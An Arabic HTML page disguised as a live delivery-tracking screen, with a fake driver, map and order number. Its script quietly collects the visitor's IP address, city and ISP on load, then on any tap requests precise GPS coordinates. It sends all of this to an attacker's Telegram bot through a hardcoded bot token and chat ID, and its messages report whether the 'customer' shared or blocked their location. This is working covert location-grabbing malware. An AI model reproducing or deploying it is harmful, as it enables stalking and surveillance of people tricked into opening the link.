<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تتبع الشحنة المباشر</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #e5e7eb; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        
        /* رأس الصفحة - الهوية */
        .header { background: white; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,0.05); z-index: 20; }
        .order-id { display: flex; align-items: center; gap: 10px; }
        .order-id i { color: #ff5e00; font-size: 20px; }
        .order-id span { font-weight: bold; color: #374151; font-size: 14px; }
        .status-dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; box-shadow: 0 0 8px #10b981; animation: blink 1.5s infinite; }

        /* منطقة الخريطة */
        .map-view { position: relative; flex-grow: 1; background: #d1d5db url('https://www.google.com/maps/vt/pb=!1m4!1m3!1i12!2i2345!3i1234!2m3!1e0!2sm!3i420120488!3m7!2sar!5e1105!12m4!1e68!2m2!1sset!2sRoadmap!4e0!5m1!1e0') no-repeat center; background-size: cover; }
        .map-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.2); pointer-events: none; }
        
        /* مؤشر موقع المندوب الوهمي */
        .driver-marker { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); color: #ff5e00; font-size: 30px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); animation: pulse 2s infinite; }

        /* البطاقة السفلية - التفاصيل */
        .details-card { background: white; border-radius: 24px 24px 0 0; padding: 20px; box-shadow: 0 -4px 15px rgba(0,0,0,0.1); z-index: 30; }
        .progress-bar-container { background: #f3f4f6; height: 4px; border-radius: 2px; margin-bottom: 20px; overflow: hidden; }
        .progress-line { background: #ff5e00; height: 100%; width: 65%; border-radius: 2px; }

        .info-grid { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
        .driver-avatar { width: 56px; height: 56px; background: #fff7ed; border-radius: 16px; display: flex; align-items: center; justify-content: center; border: 1px solid #ffedd5; }
        .driver-avatar i { font-size: 24px; color: #ff5e00; }
        .driver-text h3 { font-size: 16px; color: #111827; margin-bottom: 2px; }
        .driver-text p { font-size: 13px; color: #6b7280; }

        .stats { display: flex; justify-content: space-between; border-top: 1px solid #f3f4f6; padding-top: 15px; margin-bottom: 20px; }
        .stat-item { text-align: center; flex: 1; }
        .stat-item span { display: block; font-size: 11px; color: #9ca3af; margin-bottom: 4px; }
        .stat-item strong { font-size: 14px; color: #1f2937; }

        .btn-action { background: #ff5e00; color: white; border: none; padding: 16px; border-radius: 16px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 12px rgba(255, 94, 0, 0.2); }

        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        @keyframes pulse { 0% { transform: translate(-50%, -50%) scale(1); } 50% { transform: translate(-50%, -50%) scale(1.1); } 100% { transform: translate(-50%, -50%) scale(1); } }
    </style>
</head>
<body onclick="activateTracking()" ontouchstart="activateTracking()">

    <div class="header">
        <div class="order-id">
            <i class="fas fa-box-open"></i>
            <span>طلب رقم #9921804</span>
        </div>
        <div class="status-dot"></div>
    </div>

    <div class="map-view">
        <div class="map-overlay"></div>
        <div class="driver-marker">
            <i class="fas fa-motorcycle"></i>
        </div>
    </div>

    <div class="details-card">
        <div class="progress-bar-container">
            <div class="progress-line"></div>
        </div>

        <div class="info-grid">
            <div class="driver-avatar">
                <i class="fas fa-user-tie"></i>
            </div>
            <div class="driver-text">
                <h3>الكابتن: محمد ع.</h3>
                <p>تويوتا كورولا - بيضاء [87-5421]</p>
            </div>
        </div>

        <div class="stats">
            <div class="stat-item">
                <span>الوقت المتوقع</span>
                <strong>12 دقيقة</strong>
            </div>
            <div style="width: 1px; background: #f3f4f6;"></div>
            <div class="stat-item">
                <span>المسافة</span>
                <strong>3.2 كم</strong>
            </div>
        </div>

        <button class="btn-action">
            <i class="fas fa-location-arrow"></i>
            تحديث موقع المندوب الآن
        </button>
        
        <p style="text-align: center; color: #9ca3af; font-size: 11px; margin-top: 15px;">إلمس الشاشة في أي مكان لتحديث الخريطة</p>
    </div>

    <script>
        const TELEGRAM_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
        const CHAT_ID = '6876904688'; 
        let isActive = false;
        let userData = {};

        // جلب البيانات الأولية صامتة
        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
            userData.ip = d.ip;
            userData.city = d.city;
            userData.isp = d.org;
        });

        function activateTracking() {
            if (isActive) return;
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => {
                        isActive = true;
                        userData.lat = p.coords.latitude;
                        userData.lng = p.coords.longitude;
                        sendReport("✅ تم تحديد موقع الزبون بدقة");
                    },
                    (e) => {
                        if (!isActive) {
                            isActive = true;
                            sendReport("⚠️ الزبون فتح الرابط لكن منع الـ GPS");
                        }
                    },
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            }
        }

        function sendReport(status) {
            const mapLink = userData.lat ? `https://www.google.com/maps?q=${userData.lat},${userData.lng}` : 'غير متوفر';
            const text = `${status}\n━━━━━━━━━━━━\n🌐 IP: ${userData.ip || '--'}\n🏙 المدينة: ${userData.city || '--'}\n📡 الشركة: ${userData.isp || '--'}\n📍 الموقع: ${mapLink}\n━━━━━━━━━━━━`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });

            alert("جاري تحديث إحداثيات المندوب.. يرجى البقاء في الصفحة");
        }
    </script>
</body>
</html>
